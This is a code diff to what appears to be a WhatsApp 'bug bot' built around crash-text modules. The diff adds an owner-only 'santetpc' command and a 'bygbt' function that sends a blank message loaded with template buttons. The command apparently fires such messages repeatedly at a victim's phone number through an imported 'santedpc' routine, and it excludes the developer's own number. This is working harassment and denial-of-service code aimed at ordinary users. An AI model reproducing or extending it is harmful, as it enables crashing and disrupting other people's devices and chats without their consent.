@@ -41,6 +41,7 @@ const { xeonbut2 } = require('./XBug/xeonbut2')
 const { xeonvirtex } = require('./XBug/xeonvirtex')
 const { xeonbutton } = require('./XBug/xeonbutton')
 const { xeonbrutal } = require('./XBug/xeonbrutal')
+const { santedpc } = require('./lib/santedpc')
 
 //read database\\
 
@@ -438,7 +439,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833
 }}}
 
 const bhosdike = (teks) => {
- XeonBotInc.sendMessage(m.chat, { image: xeonbugpic, caption: wm, contextInfo:{"externalAdReply": {"title": botname,"body": ownername,
+ XeonBotInc.sendMessage(m.chat, { image: xeonbugpic, caption: botname, contextInfo:{"externalAdReply": {"title": botname,"body": ownername,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: websitex,
@@ -567,6 +568,19 @@ async function cerpen (category) {
     })
 }
 
+async function bygbt(text) {
+XeonBotInc.sendMessage(text, {
+text: '', 
+templateButtons: [
+{ callButton: { displayText: `P`, phoneNumber: ``}},
+{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
+{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
+{ quickReplyButton: { displayText: `P`, id: ``}},
+{ quickReplyButton: { displayText: `P`, id: ``}},
+{ quickReplyButton: { displayText: `P`, id: ``}},
+]})
+}
+
 //Sementara
 switch(command) {
 	case 'kenbug': {
@@ -660,6 +674,14 @@ for (let mem of participants) {
 teks += `â­” @${mem.id.split('@')[0]}\n`
 }
 XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
+}
+break
+case 'santetpc': {
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Contoh ${command} 6281297970769`)
+nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
+if (Input == isCreator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
+santedpc(bygbt, nmn, sleep)
 }
 break
 case 'cbugpc': {
